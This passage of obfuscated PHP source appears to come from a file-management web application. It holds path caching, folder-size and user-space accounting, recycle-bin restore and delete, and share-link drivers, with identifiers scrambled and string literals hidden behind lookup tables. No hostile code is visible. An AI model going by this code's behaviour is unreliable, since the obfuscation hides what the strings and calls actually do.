$ˆ­­Îáä; } $üïÒ™Ç‡ = $this->sourceInfo($»±¨çŠ); if (!$üïÒ™Ç‡) { return !1; } $üïÒ™Ç‡ = $this->_listDataApplyItem($üïÒ™Ç‡, $‰ªºƒ¯õ); self::$cachePathInfo[$Ï•º¶ˆ´] = $üïÒ™Ç‡; return $üïÒ™Ç‡; } public static $cachePathInfoMore = array(); public function pathInfoMore($«Â×³Ù) { $‹¦ÕŠª¨ =& $_SERVER[­õöî’–]; $ß¤¢ = _get(self::$cachePathInfoMore, $«Â×³Ù); if ($ß¤¢) { return $ß¤¢; } $›•ìÈçû = $this->pathInfo($«Â×³Ù); if (!$›•ìÈçû) { return !1; } if ($›•ìÈçû[$‹¦ÕŠª¨[410]] == $‹¦ÕŠª¨[88]) { $›•ìÈçû[$‹¦ÕŠª¨[79]] = $this->folderChildrenNumber($«Â×³Ù); } self::$cachePathInfoMore[$«Â×³Ù] = $›•ìÈçû; return $›•ìÈçû; } public function sourceInfo($¶¨×çÂ) { $ááîå½¤ =& $_SERVER[­õöî’–]; if (!$¶¨×çÂ) { return array(); } $¶¨×çÂ = intval($¶¨×çÂ); $ã˜•‚Îó = $ááîå½¤[460] . $¶¨×çÂ; $Ñüõ–Á = _get(self::$cacheSourceInfo, $ã˜•‚Îó); if ($Ñüõ–Á) { return $Ñüõ–Á; } $­ïÚĞÚ = $this->where(array($ááîå½¤[402] => $¶¨×çÂ))->find(); self::$cacheSourceInfo[$ã˜•‚Îó] = $­ïÚĞÚ; return self::$cacheSourceInfo[$ã˜•‚Îó]; } public function sourceCacheClear($¼½ãÔ• = false) { self::cacheClear($¼½ãÔ•); } public static function cacheClear($Õºä‘±è = false) { $°ŸÅ÷¿ =& $_SERVER[­õöî’–]; if ($Õºä‘±è == !1) { self::$cacheSourceInfo = null; self::$cacheSourceInfo = array(); self::$cachePathInfo = null; self::$cachePathInfo = array(); self::$cachePathInfoMore = null; self::$cachePathInfoMore = array(); return; } unset(self::$cacheSourceInfo[$°ŸÅ÷¿[460] . $Õºä‘±è]); unset(self::$cachePathInfoMore[$Õºä‘±è]); unset(self::$cachePathInfo[$°ŸÅ÷¿[2146] . $Õºä‘±è]); unset(self::$cachePathInfo[$°ŸÅ÷¿[2147] . $Õºä‘±è]); } public function metaSet($ËÃşİ„, $³·€Äù„ = null, $çêÏ½Ï® = null) { $¨¤›ñÄ = parent::metaSet($ËÃşİ„, $³·€Äù„, $çêÏ½Ï®); if ($¨¤›ñÄ) { $this->sourceCacheClear($ËÃşİ„); } return $¨¤›ñÄ; } public function pathInfoByPath($“£’ÒÄ, $ã±Ôæğ¶) { $ˆä °¼ =& $_SERVER[­õöî’–]; $×›¾±Üå = !$ã±Ôæğ¶ ? array() : explode($ˆä °¼[8], trim($ã±Ôæğ¶, $ˆä °¼[8])); $„‹€›»‚ = $“£’ÒÄ; foreach ($×›¾±Üå as $£·…‹šö) { $îöœ™” = array($ˆä °¼[432] => $„‹€›»‚, $ˆä °¼[32] => $£·…‹šö); $ÂÅ¶‘™„ = $this->where($îöœ™”)->select(); if (!$ÂÅ¶‘™„) { return !1; } $ÂÅ¶‘™„ = array_sort_by($ÂÅ¶‘™„, $ˆä °¼[431]); $„‹€›»‚ = $ÂÅ¶‘™„[0][$ˆä °¼[402]]; } return $this->pathInfo($„‹€›»‚, !0); } protected function updateModifyTime($…ü¡¶¥Ó) { $ƒ™š›˜ =& $_SERVER[­õöî’–]; $ûé˜Ê = defined($ƒ™š›˜[475]) ? USER_ID : $ƒ™š›˜[197]; if (!$…ü¡¶¥Ó) { return; } if (!is_array($…ü¡¶¥Ó)) { $…ü¡¶¥Ó = array($…ü¡¶¥Ó); } foreach ($…ü¡¶¥Ó as $´Ç¯Å => $˜ëûƒŞÆ) { $…ü¡¶¥Ó[$´Ç¯Å] = intval($˜ëûƒŞÆ); $this->sourceCacheClear($˜ëûƒŞÆ); } $ª²•¥Ä… = array($ƒ™š›˜[402] => array($ƒ™š›˜[7], $…ü¡¶¥Ó)); $°ƒŞ§´÷ = array($ƒ™š›˜[589] => $ûé˜Ê, $ƒ™š›˜[424] => time()); $this->where($ª²•¥Ä…)->save($°ƒŞ§´÷); } public function folderSizeReset($Üƒœû°á, $ ®Şîõ‰ = false) { $†Ê­¥…Ã =& $_SERVER[­õöî’–]; if ($this->statusIgnoreResetSpace) { return; } $ä£ĞâŒÂ = $this->sourceInfo($Üƒœû°á); $—³ÉíÒ = $†Ê­¥…Ã[2148] . $Üƒœû°á; CacheLock::lock($—³ÉíÒ, 20); if ($ ®Şîõ‰ === !1) { $this->sourceCacheClear($Üƒœû°á); $ä£ĞâŒÂ = $this->sourceInfo($Üƒœû°á); $Ü‰®¦×… = array($†Ê­¥…Ã[401] => $Üƒœû°á, $†Ê­¥…Ã[430] => 0); $š¤ö§´ = $this->where($Ü‰®¦×…)->sum($†Ê­¥…Ã[76]); $ ®Şîõ‰ = intval($š¤ö§´) - intval($ä£ĞâŒÂ[$†Ê­¥…Ã[76]]); } if ($ ®Şîõ‰ == 0) { return CacheLock::unlock($—³ÉíÒ); } $¤£¦¸§… = $this->parentLevelArray($ä£ĞâŒÂ[$†Ê­¥…Ã[521]]); if (!$¤£¦¸§…) { $¤£¦¸§… = array(); } $¤£¦¸§…[] = $ä£ĞâŒÂ[$†Ê­¥…Ã[402]]; $Ü‰®¦×… = array($†Ê­¥…Ã[402] => array($†Ê­¥…Ã[418], $¤£¦¸§…)); if ($ ®Şîõ‰ < 0) { $Ü‰®¦×…[$†Ê­¥…Ã[76]] = array($†Ê­¥…Ã[1013], abs($ ®Şîõ‰)); } $this->where($Ü‰®¦×…)->setAdd($†Ê­¥…Ã[76], $ ®Şîõ‰); CacheLock::unlock($—³ÉíÒ); $Æœ´ßöÏ = $†Ê­¥…Ã[2149] . $ä£ĞâŒÂ[$†Ê­¥…Ã[411]] . $†Ê­¥…Ã[4] . $ä£ĞâŒÂ[$†Ê­¥…Ã[505]]; $©½¿­ = array($ä£ĞâŒÂ[$†Ê­¥…Ã[411]], $ä£ĞâŒÂ[$†Ê­¥…Ã[505]]); TaskRun::timeLimitCall($Æœ´ßöÏ, $†Ê­¥…Ã[2150], $©½¿­, 1.5); } public function folderSizeResetChildren($‚ŠîÂ¡ù) { $Ìµ“ŞÀ =& $_SERVER[­õöî’–]; $this->sourceCacheClear($‚ŠîÂ¡ù); $‘ªóÎ = $this->sourceInfo($‚ŠîÂ¡ù); $üÀˆÁÏÉ = array($Ìµ“ŞÀ[583] => 1, $Ìµ“ŞÀ[587] => $‘ªóÎ[$Ìµ“ŞÀ[505]], $Ìµ“ŞÀ[590] => array($Ìµ“ŞÀ[550], $‘ªóÎ[$Ìµ“ŞÀ[521]] . $‚ŠîÂ¡ù . $Ìµ“ŞÀ[551])); $Ğ ’ˆ¾ = $Ìµ“ŞÀ[2151]; $ƒ½Û±¡ = $this->field($Ğ ’ˆ¾)->where($üÀˆÁÏÉ)->select(); $üÀˆÁÏÉ[$Ìµ“ŞÀ[410]] = 0; $…Îìä²â = $this->field($Ğ ’ˆ¾)->where($üÀˆÁÏÉ)->select(); if (!$…Îìä²â) { return; } $ƒ½Û±¡[] = $‘ªóÎ; $ƒ½Û±¡ = array_to_keyvalue($ƒ½Û±¡, $Ìµ“ŞÀ[402]); foreach ($ƒ½Û±¡ as $Üçß¨ => $Í´îæÔß) { $ƒ½Û±¡[$Üçß¨][$Ìµ“ŞÀ[2152]] = $ƒ½Û±¡[$Üçß¨][$Ìµ“ŞÀ[76]]; $ƒ½Û±¡[$Üçß¨][$Ìµ“ŞÀ[76]] = 0; } foreach ($…Îìä²â as $Í´îæÔß) { $ªáèóÓÀ = $Í´îæÔß[$Ìµ“ŞÀ[432]] . $Ìµ“ŞÀ[12]; if (!isset($ƒ½Û±¡[$ªáèóÓÀ])) { continue; } if ($Í´îæÔß[$Ìµ“ŞÀ[431]] == $ƒ½Û±¡[$ªáèóÓÀ][$Ìµ“ŞÀ[431]]) { $ƒ½Û±¡[$ªáèóÓÀ][$Ìµ“ŞÀ[76]] += $Í´îæÔß[$Ìµ“ŞÀ[76]]; } } foreach ($ƒ½Û±¡ as $Í´îæÔß) { $Ş»è÷§é = $this->parentLevelArray($Í´îæÔß[$Ìµ“ŞÀ[521]]); foreach ($Ş»è÷§é as $ªáèóÓÀ) { $ªáèóÓÀ = $ªáèóÓÀ . $Ìµ“ŞÀ[12]; if (!isset($ƒ½Û±¡[$ªáèóÓÀ])) { continue; } if ($Í´îæÔß[$Ìµ“ŞÀ[431]] == $ƒ½Û±¡[$ªáèóÓÀ][$Ìµ“ŞÀ[431]]) { $ƒ½Û±¡[$ªáèóÓÀ][$Ìµ“ŞÀ[76]] += $Í´îæÔß[$Ìµ“ŞÀ[76]]; } } } $÷È† ‡û = array(); foreach ($ƒ½Û±¡ as $Í´îæÔß) { if ($Í´îæÔß[$Ìµ“ŞÀ[76]] == $Í´îæÔß[$Ìµ“ŞÀ[2152]]) { continue; } $÷È† ‡û[] = array($Ìµ“ŞÀ[402], $Í´îæÔß[$Ìµ“ŞÀ[402]], $Ìµ“ŞÀ[76], $Í´îæÔß[$Ìµ“ŞÀ[76]]); } $this->saveAll($÷È† ‡û); } public function userSpaceReset($ÑÏÀáÌ = false) { $¦¹Õšùµ =& $_SERVER[­õöî’–]; $ÕÏßÔØÁ = $this->where(array($¦¹Õšùµ[411] => self::TYPE_USER, $¦¹Õšùµ[505] => $ÑÏÀáÌ, $¦¹Õšùµ[410] => 0))->sum($¦¹Õšùµ[76]); $ÕÏßÔØÁ = !$ÕÏßÔØÁ || $ÕÏßÔØÁ <= 0 ? 0 : $ÕÏßÔØÁ; Model($¦¹Õšùµ[513])->userEdit($ÑÏÀáÌ, array($¦¹Õšùµ[1838] => $ÕÏßÔØÁ)); } public function targetSpaceUpdate($Ôò¾î, $Èàá£•ç) { $íËäÕã =& $_SERVER[­õöî’–]; if (!$Èàá£•ç) { return; } if (!in_array($Ôò¾î, array(self::TYPE_USER, self::TYPE_GROUP))) { return; } $ÏÄàÏ‰§ = $this->targetSpaceSize($Ôò¾î, $Èàá£•ç); if ($Ôò¾î == self::TYPE_USER) { Model($íËäÕã[513])->userEdit($Èàá£•ç, array($íËäÕã[1838] => $ÏÄàÏ‰§)); } else { if ($Ôò¾î == self::TYPE_GROUP) { Model($íËäÕã[522])->groupEdit($Èàá£•ç, array($íËäÕã[1838] => $ÏÄàÏ‰§)); } } } public function targetSpaceSize($é›ï´Í, $Û£¼…İ€) { $‡è·ÉÖ² =& $_SERVER[­õöî’–]; $­¿ïöªĞ = 0; $ç¢¤ºß = $this->targetSourceRoot($é›ï´Í, $Û£¼…İ€, !0); foreach ($ç¢¤ºß as $çƒææåî) { if (!$çƒææåî) { continue; } $­¿ïöªĞ += floatval($çƒææåî[$‡è·ÉÖ²[76]]); $©«Ğ±Ì¤ = array($‡è·ÉÖ²[590] => array($‡è·ÉÖ²[550], $‡è·ÉÖ²[531] . $çƒææåî[$‡è·ÉÖ²[402]] . $‡è·ÉÖ²[551])); $áãŒã™£ = Model($‡è·ÉÖ²[429])->field($‡è·ÉÖ²[417])->where($©«Ğ±Ì¤)->select(); $áãŒã™£ = array_to_keyvalue($áãŒã™£, $‡è·ÉÖ²[12], $‡è·ÉÖ²[402]); $áãŒã™£ = array_unique(array_filter($áãŒã™£)); if ($áãŒã™£) { $©«Ğ±Ì¤ = array($‡è·ÉÖ²[417] => array($‡è·ÉÖ²[418], $áãŒã™£)); $­¿ïöªĞ += floatval($this->where($©«Ğ±Ì¤)->sum($‡è·ÉÖ²[76])); } } $­¿ïöªĞ = !$­¿ïöªĞ || $­¿ïöªĞ <= 0 ? 0 : $­¿ïöªĞ; return $­¿ïöªĞ; } public function allFileTypeProfile() { return $this->fileTypeProfile(!1, !1); } public function userFileTypeProfile($ìœï–‰Ô) { return $this->fileTypeProfile($ìœï–‰Ô, SourceModel::TYPE_USER); } public function groupFileTypeProfile($©†ûÇÚï) { return $this->fileTypeProfile($©†ûÇÚï, SourceModel::TYPE_GROUP); } private function fileTypeProfile($ÃÖÁ÷—Ş, $ƒã¨ßøæ) { $şÛ„ş×× =& $_SERVER[­õöî’–]; $œ¨ÏÄ¿ = $şÛ„ş××[2153] . $ÃÖÁ÷—Ş . $şÛ„ş××[11] . $ƒã¨ßøæ; $Œ­¥†ãÛ = Cache::get($œ¨ÏÄ¿); if ($Œ­¥†ãÛ) { return $Œ­¥†ãÛ; } $ñòÛ¡ÅÍ = array($şÛ„ş××[583] => 0); if ($ÃÖÁ÷—Ş != !1) { $ñòÛ¡ÅÍ[$şÛ„ş××[505]] = $ÃÖÁ÷—Ş; $ñòÛ¡ÅÍ[$şÛ„ş××[411]] = $ƒã¨ßøæ; } $‹€…º”« = array(); $‹€…º”«[$şÛ„ş××[2154]] = array($şÛ„ş××[2155] => LNG($şÛ„ş××[2154]), $şÛ„ş××[2156] => $this->where($ñòÛ¡ÅÍ)->count(), $şÛ„ş××[585] => $this->where($ñòÛ¡ÅÍ)->sum($şÛ„ş××[76])); $È•ìéÉ× = KodIO::fileTypeList(); foreach ($È•ìéÉ× as $ÓŸ¡Şî´ => $´¿ûÉ¯§) { $ñòÛ¡ÅÍ[$şÛ„ş××[412]] = $this->fileTypeWhere($ÓŸ¡Şî´); $‹€…º”«[$ÓŸ¡Şî´] = array($şÛ„ş××[2155] => $´¿ûÉ¯§[$şÛ„ş××[32]], $şÛ„ş××[2156] => $this->where($ñòÛ¡ÅÍ)->count(), $şÛ„ş××[585] => $this->where($ñòÛ¡ÅÍ)->sum($şÛ„ş××[76])); } Cache::set($œ¨ÏÄ¿, $‹€…º”«, 1200); return $‹€…º”«; } public function fileNameExist($®“ïéÒà, $’Ñ¿ÖÅ¸) { $Ò›×Œ ß =& $_SERVER[­õöî’–]; $ƒÇŸ²„ë = $this->where(array($Ò›×Œ ß[432] => $®“ïéÒà, $Ò›×Œ ß[32] => $’Ñ¿ÖÅ¸, $Ò›×Œ ß[431] => 0))->find(); return is_array($ƒÇŸ²„ë) ? $ƒÇŸ²„ë[$Ò›×Œ ß[402]] : !1; } public function childList($¿óêš“) { $´›ëá½ü =& $_SERVER[­õöî’–]; $òàÚ®ÒÀ = $´›ëá½ü[2131] . $¿óêš“; if (isset(self::$cacheChildList[$òàÚ®ÒÀ])) { return self::$cacheChildList[$òàÚ®ÒÀ]; } $ùÎ¶ÙÚç = array($´›ëá½ü[432] => intval($¿óêš“), $´›ëá½ü[431] => 0); $Ó½¼­ñ¿ = $this->where($ùÎ¶ÙÚç)->select(); $Ó½¼­ñ¿ = $Ó½¼­ñ¿ ? $Ó½¼­ñ¿ : array(); self::$cacheChildList[$òàÚ®ÒÀ] = $Ó½¼­ñ¿; foreach ($Ó½¼­ñ¿ as $ÒÒ¹õ£û) { $òàÚ®ÒÀ = $´›ëá½ü[460] . $ÒÒ¹õ£û[$´›ëá½ü[402]]; self::$cacheSourceInfo[$òàÚ®ÒÀ] = $ÒÒ¹õ£û; } return $Ó½¼­ñ¿; } public function fileNameAuto($¬¡µú•Ë, $Œúß¥‚Æ, $ÒèÁ°ğ‡ = REPEAT_RENAME, $Æ¾ÄĞõş = false) { $êå—”À÷ =& $_SERVER[­õöî’–]; $…èÊòŠ£ = get_path_ext($Œúß¥‚Æ); $êüÄ¦ûô = $…èÊòŠ£ ? basename($Œúß¥‚Æ, $êå—”À÷[10] . $…èÊòŠ£) . $êå—”À÷[2157] . $…èÊòŠ£ : $Œúß¥‚Æ . $êå—”À÷[384]; $Ü×ä°³ = array($êå—”À÷[432] => $¬¡µú•Ë, $êå—”À÷[431] => 0, $êå—”À÷[32] => array($êå—”À÷[383], $êüÄ¦ûô)); $ç¸ú—´‘ = $this->field($êå—”À÷[32])->where($Ü×ä°³)->select(); $í–ôƒó¥ = array_to_keyvalue($ç¸ú—´‘, $êå—”À÷[12], $êå—”À÷[32]); return $this->fileNameAutoGet($í–ôƒó¥, $Œúß¥‚Æ, $ÒèÁ°ğ‡, $Æ¾ÄĞõş); } public function fileNameAutoGet($ßØ´¨ª, $İèáÀÀ, $â‰ƒ¶¸§, $ÚÜş¥§) { $Â†äÅÒ =& $_SERVER[­õöî’–]; if ($â‰ƒ¶¸§ == REPEAT_REPLACE || !$ßØ´¨ª || !in_array_not_case($İèáÀÀ, $ßØ´¨ª) || $ÚÜş¥§ && $â‰ƒ¶¸§ != REPEAT_RENAME_FOLDER) { return $İèáÀÀ; } if ($â‰ƒ¶¸§ == REPEAT_SKIP) { return !1; } $áîµİ¿• = $Â†äÅÒ[10] . get_path_ext($İèáÀÀ); $áîµİ¿• = $áîµİ¿• == $Â†äÅÒ[10] || $ÚÜş¥§ ? $Â†äÅÒ[12] : $áîµİ¿•; for ($úÉŠÑÔ = 1; $úÉŠÑÔ <= count($ßØ´¨ª) + 1; $úÉŠÑÔ++) { $‰‘Â«Šç = substr($İèáÀÀ, 0, strlen($İèáÀÀ) - strlen($áîµİ¿•)); $ß¥äÎÃ = $‰‘Â«Šç . "\50{$úÉŠÑÔ}\x29{$áîµİ¿•}"; if (!in_array_not_case($ß¥äÎÃ, $ßØ´¨ª)) { return $ß¥äÎÃ; } } } } class SourceRecycleModel extends ModelBase { protected $tableName = "\151\157\137\x73\157\x75\x72\x63\x65\x5f\x72\145\x63\171\x63\154\x65"; protected $dataAuto = array(array("\143\162\x65\x61\164\x65\x54\151\155\x65", "\x74\x69\155\145", "\x69\156\x73\x65\162\164", "\x66\x75\x6e\x63\x74\151\x6f\156")); public function listData($Œòˆ¹ = false) { $åï„òÆĞ =& $_SERVER[­õöî’–]; $Œòˆ¹ = $Œòˆ¹ ? $Œòˆ¹ : USER_ID; $îÈÍ¤…õ = $this->where(array($åï„òÆĞ[1651] => $Œòˆ¹))->select(); return array_to_keyvalue($îÈÍ¤…õ, $åï„òÆĞ[12], $åï„òÆĞ[402]); } public function moveToRecycle($£Ääêİ) { $óş÷ØÂò =& $_SERVER[­õöî’–]; $ä›çÙè› = Model($óş÷ØÂò[1334]); $àİô¼¼Ğ = $ä›çÙè›->sourceInfo($£Ääêİ); if (!$àİô¼¼Ğ || $àİô¼¼Ğ[$óş÷ØÂò[431]] == $óş÷ØÂò[88]) { return; } $ë¹Í¤¿æ = array($óş÷ØÂò[417] => $£Ääêİ, $óş÷ØÂò[1651] => USER_ID, $óş÷ØÂò[586] => $àİô¼¼Ğ[$óş÷ØÂò[411]], $óş÷ØÂò[587] => $àİô¼¼Ğ[$óş÷ØÂò[505]], $óş÷ØÂò[590] => $àİô¼¼Ğ[$óş÷ØÂò[521]]); $this->add($ë¹Í¤¿æ); $this->recycleMove($£Ääêİ, 1); if ($àİô¼¼Ğ[$óş÷ØÂò[410]] == $óş÷ØÂò[88]) { $æ²ñİå = array($óş÷ØÂò[590] => array($óş÷ØÂò[550], $àİô¼¼Ğ[$óş÷ØÂò[521]] . $£Ääêİ . $óş÷ØÂò[551])); $ä›çÙè›->where($æ²ñİå)->setField($óş÷ØÂò[431], 1); } } public function clear() { $this->remove(!1); } public function remove($»ï÷Ä¢ = false, $·ë†ÆŸÓ = false) { $öÈàºı =& $_SERVER[­õöî’–]; $·ë†ÆŸÓ = $·ë†ÆŸÓ ? $·ë†ÆŸÓ : USER_ID; $ÀÈŠ© = Model($öÈàºı[1334]); $²Ş¡ŞúÓ = $this->listData($·ë†ÆŸÓ); $»ï÷Ä¢ = $»ï÷Ä¢ === !1 ? !1 : $»ï÷Ä¢; $Ñ²°úÆô = array(); foreach ($²Ş¡ŞúÓ as $ôá°Ö«) { if ($»ï÷Ä¢ != !1 && !in_array($ôá°Ö«, $»ï÷Ä¢)) { continue; } $¬éË¸æĞ = $ÀÈŠ©->sourceInfo($ôá°Ö«); $ÀÈŠ©->remove($ôá°Ö«, !1); $Ì†ˆÊ = $¬éË¸æĞ[$öÈàºı[411]] . $öÈàºı[11] . $¬éË¸æĞ[$öÈàºı[505]]; $Ñ²°úÆô[$Ì†ˆÊ] = array($öÈàºı[586] => $¬éË¸æĞ[$öÈàºı[411]], $öÈàºı[505] => $¬éË¸æĞ[$öÈàºı[505]]); $this->where(array($öÈàºı[402] => $ôá°Ö«))->delete(); } foreach ($Ñ²°úÆô as $ªû‘ÎæË) { $ÀÈŠ©->targetSpaceUpdate($ªû‘ÎæË[$öÈàºı[411]], $ªû‘ÎæË[$öÈàºı[505]]); } } public function restore($ÔÃğİ®— = false) { $ñÑ›Êê = $this->listData(); $this->_restoreSource($ñÑ›Êê, $ÔÃğİ®—); } public function removeUserAll($Ûê±Ø…³) { $this->remove(!1, $Ûê±Ø…³); } private function _restoreSource($Œà¬§×Š, $€Ä›™„•) { $ºàºŠµ =& $_SERVER[­õöî’–]; $ÓšôÖÍù = Model($ºàºŠµ[1334]); $€Ä›™„• = $€Ä›™„• == !1 ? !1 : $€Ä›™„•; if (!$Œà¬§×Š) { return !0; } $Ù”¸¢´ = array(); foreach ($Œà¬§×Š as $‡½¥‹Ç‹) { if ($€Ä›™„• != !1 && !in_array($‡½¥‹Ç‹, $€Ä›™„•)) { continue; } $®˜©˜Ä = $ÓšôÖÍù->sourceInfo($‡½¥‹Ç‹); $ÈîÀ’ = $ÓšôÖÍù->sourceInfo($®˜©˜Ä[$ºàºŠµ[432]]); if ($ÈîÀ’[$ºàºŠµ[431]] == $ºàºŠµ[88]) { continue; } $ÓšôÖÍù->lockMoveStart($‡½¥‹Ç‹); $this->recycleMove($‡½¥‹Ç‹, 0); if ($®˜©˜Ä[$ºàºŠµ[410]] == $ºàºŠµ[88]) { $Ğè­°óÛ = array($ºàºŠµ[590] => array($ºàºŠµ[550], $®˜©˜Ä[$ºàºŠµ[521]] . $‡½¥‹Ç‹ . $ºàºŠµ[551])); $ÓšôÖÍù->where($Ğè­°óÛ)->setField($ºàºŠµ[431], 0); $this->restoreFolderChildren($‡½¥‹Ç‹, $Œà¬§×Š); } $this->where(array($ºàºŠµ[402] => $‡½¥‹Ç‹))->delete(); $ÓšôÖÍù->folderSizeReset($®˜©˜Ä[$ºàºŠµ[432]]); $Ù”¸¢´[] = $®˜©˜Ä[$ºàºŠµ[432]]; if ($®˜©˜Ä[$ºàºŠµ[410]] == $ºàºŠµ[88]) { $Ù”¸¢´[] = $‡½¥‹Ç‹; } $ÓšôÖÍù->lockMoveEnd($‡½¥‹Ç‹); } $ÓšôÖÍù->updateModifyTime($Ù”¸¢´); } private function restoreFolderChildren($çÎÊşé, $ß°µüäğ) { $×ôÍÜ¶Ö =& $_SERVER[­õöî’–]; $úÊ¶‰²µ = Model($×ôÍÜ¶Ö[1334]); $Áê²—”ï = array($×ôÍÜ¶Ö[402] => array($×ôÍÜ¶Ö[7], array())); foreach ($ß°µüäğ as $‡›Ìºáü) { if ($‡›Ìºáü == $çÎÊşé) { continue; } if (!$úÊ¶‰²µ->isParentOf($çÎÊşé, $‡›Ìºáü)) { continue; } $×·õô¼Œ = $úÊ¶‰²µ->sourceInfo($‡›Ìºáü); if ($×·õô¼Œ[$×ôÍÜ¶Ö[410]] == $×ôÍÜ¶Ö[88]) { $Áê²—”ï[] = array($×ôÍÜ¶Ö[590] => array($×ôÍÜ¶Ö[550], $×·õô¼Œ[$×ôÍÜ¶Ö[521]] . $‡›Ìºáü . $×ôÍÜ¶Ö[551])); } else { $Áê²—”ï[$×ôÍÜ¶Ö[402]][1][] = $‡›Ìºáü; } } if (!$Áê²—”ï[$×ôÍÜ¶Ö[402]][1]) { unset($Áê²—”ï[$×ôÍÜ¶Ö[402]]); } if (!$Áê²—”ï) { return; } $Áê²—”ï[$×ôÍÜ¶Ö[402]][1] = array_unique($Áê²—”ï[$×ôÍÜ¶Ö[402]][1]); $Áê²—”ï[$×ôÍÜ¶Ö[998]] = $×ôÍÜ¶Ö[1947]; $úÊ¶‰²µ->where($Áê²—”ï)->setField($×ôÍÜ¶Ö[431], 1); } private function recycleMove($©ã»ÈÆ, $ğÈÉ‹ß× = 1) { $¥©í©á =& $_SERVER[­õöî’–]; $Œ¸´‰À¨ = Model($¥©í©á[1334]); $ãÁ‡ƒŠŒ = Model($¥©í©á[2158]); $´«¼¯®š = array($¥©í©á[402] => $©ã»ÈÆ); if ($ğÈÉ‹ß×) { $Œ¸´‰À¨->where($´«¼¯®š)->setField($¥©í©á[431], 1); $ãÁ‡ƒŠŒ->eventRecycle($©ã»ÈÆ, $¥©í©á[2159]); } else { $ü” ’â = $Œ¸´‰À¨->where($´«¼¯®š)->find(); $¢ü¡À = $ü” ’â[$¥©í©á[410]] == $¥©í©á[88]; $Ï™ôù = $Œ¸´‰À¨->fileNameAuto($ü” ’â[$¥©í©á[432]], $ü” ’â[$¥©í©á[32]], REPEAT_RENAME_FOLDER, $¢ü¡À); if ($Ï™ôù != $ü” ’â[$¥©í©á[32]]) { $Œ¸´‰À¨->rename($©ã»ÈÆ, $Ï™ôù); } $Œ¸´‰À¨->where($´«¼¯®š)->setField($¥©í©á[431], 0); $ãÁ‡ƒŠŒ->eventRecycle($©ã»ÈÆ, $¥©í©á[2160]); } } } goto Bğ¨¹ÅÏ÷Š; c›ô‹Ö¸…˜: class PathDriverDbShareLink extends PathDriverDB { public function __construct($×âõ•šı) { $this->pathParse = $×âõ•šı; $this->model = Model($_SERVER[­õöî’–][1334]); } protected function infoParse($š²®ŸÔ×, $¿Ÿó”“­ = false, $¬’Â‰–Ó = false) { $£Úù¥Ç =& $_SERVER[­õöî’–]; return Action($£Úù¥Ç[1173])->sharePathInfo($this->pathParse[$£Úù¥Ç[84]], !0, $¿Ÿó”“­); } public function listPath($ÏÑ’Şê¨, $ß¾Ş’Óì = false) { $ÊÁ‚ñ©¯ =& $_SERVER[­õöî’–]; $ŒÄş‡±± = parent::listPath($ÏÑ’Şê¨, $ß¾Ş’Óì); if (!$ŒÄş‡±±) { return $ŒÄş‡±±; } if (is_array($ŒÄş‡±±[$ÊÁ‚ñ©¯[1343]])) { $ŒÄş‡±±[$ÊÁ‚ñ©¯[1343]] = Action($ÊÁ‚ñ©¯[1173])->shareItemInfo($ŒÄş‡±±[$ÊÁ‚ñ©¯[1343]]); } foreach ($ŒÄş‡±± as $öĞÇûûŒ => $òø–—‡š) { if (!in_array($öĞÇûûŒ, array($ÊÁ‚ñ©¯[83], $ÊÁ‚ñ©¯[82]))) { continue; } foreach ($òø–—‡š as $³†“âÊ => $à»„¸‚) { $ŒÄş‡±±[$öĞÇûûŒ][$³†“âÊ] = Action($ÊÁ‚ñ©¯[1173])->shareItemInfo($à»„¸‚); } } return $ŒÄş‡±±; } public function listAll($—ó›†µÒ) { $ãªüö´ =& $_SERVER[­õöî’–]; $ì‹§Å³’ = IO::info($this->pathParse[$ãªüö´[84]]); if (!$ì‹§Å³’) { return array(); } $ğïÍ÷™ = $this->model->listAll($—ó›†µÒ); foreach ($ğïÍ÷™ as &$Şˆ§íí) { $Şˆ§íí[$ãªüö´[86]] = Action($ãªüö´[1173])->shareItemInfo($Şˆ§íí[$ãªüö´[86]]); } unset($Şˆ§íí); return $ğïÍ÷™; } } class PathDriverDriverShareItem { public function __construct($ÏÓ™ûÇ) { $this->pathParse = $ÏÓ™ûÇ; } public function __call($ÏŸÊÜøè, $‡œ±«Ú) { $ƒæ”ÃÏ§ =& $_SERVER[­õöî’–]; if (method_exists($this, $ÏŸÊÜøè)) { return; } $ºõËıÄ­ = call_user_func_array(array($ƒæ”ÃÏ§[1344], $ÏŸÊÜøè), $‡œ±«Ú); $ŠêÄªå = array($ƒæ”ÃÏ§[1345], $ƒæ”ÃÏ§[1346], $ƒæ”ÃÏ§[1347], $ƒæ”ÃÏ§[1348], $ƒæ”ÃÏ§[555], $ƒæ”ÃÏ§[557], $ƒæ”ÃÏ§[1349], $ƒæ”ÃÏ§[107], $ƒæ”ÃÏ§[1350], $ƒæ”ÃÏ§[1351]); if (in_array($ÏŸÊÜøè, $ŠêÄªå)) { $ºõËıÄ­ = $this->getPathOuter($ºõËıÄ­); } return $ºõËıÄ­; } public function copy($É·“¯ãÀ, $üÛÅÕĞ‡, $È²ö„Å¸ = false, $èõ–•¾ï = false) { return $this->copyMove($É·“¯ãÀ, $üÛÅÕĞ‡, $È²ö„Å¸, $_SERVER[­õöî’–][555], $èõ–•¾ï); } public function move($Úºë’Ÿ¥, $·Ï´ ¿™, $àÎö•‘Å = false, $ù½´ë¤á = false) { return $this->copyMove($Úºë’Ÿ¥, $·Ï´ ¿™, $àÎö•‘Å, $_SERVER[­õöî’–][557], $ù½´ë¤á); } private function copyMove($®¯í‡Â›, $Ö·Ãñ˜è, $Ï±Â€ÒÖ, $´™¤ƒñò, $§ğÈ¦ = false) { $éİìÏÂì =& $_SERVER[­õöî’–]; $›íĞàÊè = $Ö·Ãñ˜è; $‡¦ùàİ® = IO::driverMake($Ö·Ãñ˜è); if ($‡¦ùàİ®->pathParse[$éİìÏÂì[1149]]) { $Ö·Ãñ˜è = $‡¦ùàİ®->pathParse[$éİìÏÂì[1149]]; } else { $Ö·Ãñ˜è = $›íĞàÊè; } $îªø©Ù‚ = IO::copyMove($®¯í‡Â›, $Ö·Ãñ˜è, $Ï±Â€ÒÖ, $´™¤ƒñò, $§ğÈ¦); $îªø©Ù‚ = $this->getPathOuter($îªø©Ù‚); return $îªø©Ù‚; } public function pathThis($“¥²Ü˜é) { return get_path_this($this->pathParse[$_SERVER[­õöî’–][84]]); } public function pathFather($ôÂû²ãâ) { return get_path_father($this->pathParse[$_SERVER[­õöî’–][84]]); } public function iconvSystem($Ñ©”ËÒƒ) { return $Ñ©”ËÒƒ; } protected function infoParse($¯ô Î£–, $ãÑòŸÔ = false) { $ÌìˆÄğê =& $_SERVER[­õöî’–]; $ÖÄŞßÊ± = 